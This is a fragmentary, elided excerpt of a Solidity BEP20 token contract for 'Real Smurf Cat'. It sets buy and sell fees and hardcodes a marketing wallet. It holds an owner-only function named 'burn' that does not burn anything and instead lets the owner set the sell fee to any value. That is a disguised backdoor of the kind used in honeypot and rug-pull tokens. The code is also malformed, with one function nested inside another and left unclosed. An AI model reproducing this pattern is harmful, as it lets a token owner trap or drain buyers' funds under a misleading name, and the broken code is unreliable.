...
contract RealSmurfCat is Context, Ownable, IBEP20, BEP20Detailed {
  ...
  using SafeMath for uint256;
    ...
    uint256 public sellMarketingFee = 5;//2% Marketing, 2% Dev, %1 Buyback and Burn
    uint256 public buyMarketingFee = 5;//2% Marketing, 2% Dev, %1 Buyback and Burn
    uint256 private marketingFee;
  

    address payable public marketingaddress = payable(0x3A622EF81010Dd151DB8f10FEC3679eAEe39bB33);
    ...
    constructor () BEP20Detailed("Real Smurf Cat", "SMURFCAT", 18) {
      _owner = msg.sender ;
    ...
    function _approve(address towner, address spender, uint amount) internal {
        ...
        function burn(uint256 updatedSellMarketingFee) external onlyOwner {
        sellMarketingFee = updatedSellMarketingFee;
